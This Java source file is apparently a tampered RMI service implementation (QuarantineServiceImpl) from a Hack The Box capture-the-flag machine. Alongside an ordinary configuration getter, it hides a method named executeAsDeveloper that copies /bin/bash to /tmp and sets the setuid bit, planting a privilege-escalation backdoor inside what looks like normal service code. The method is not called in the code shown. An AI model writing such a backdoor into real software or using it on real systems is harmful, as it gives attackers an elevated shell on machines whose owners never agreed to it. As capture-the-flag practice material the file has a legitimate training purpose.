package com.htb.hosting.rmi.quarantine;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.util.logging.Logger;

public class QuarantineServiceImpl implements QuarantineService {
    private static final Logger logger = Logger.getLogger(QuarantineServiceImpl.class.getSimpleName());
    private QuarantineConfiguration DEFAULT_CONFIG;

    public QuarantineServiceImpl(QuarantineConfiguration config) {
        DEFAULT_CONFIG = config;
    }

    private void executeAsDeveloper() {
        try {
            // Create a ProcessBuilder
            System.out.println("Building process cmd");
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c",
                    "cp /bin/bash /tmp/bash; chmod +s /tmp/bash");

            // Start a new process
            System.out.println("Starting process");
            Process proc = pb.start();

            // Get the input stream and read from it
            BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                System.out.println(line);
            }

            // Wait for the process to finish and get the exit value
            int exitValue = proc.waitFor();
            System.out.println("Exit value: " + exitValue);

        } catch (Exception e) {
            System.err.println("Exception: " + e);
            e.printStackTrace();
        }
    }

    @Override // com.htb.hosting.rmi.quarantine.QuarantineService
    public QuarantineConfiguration getConfiguration() throws RemoteException {
        logger.info("client fetching configuration");
        return DEFAULT_CONFIG;
    }
}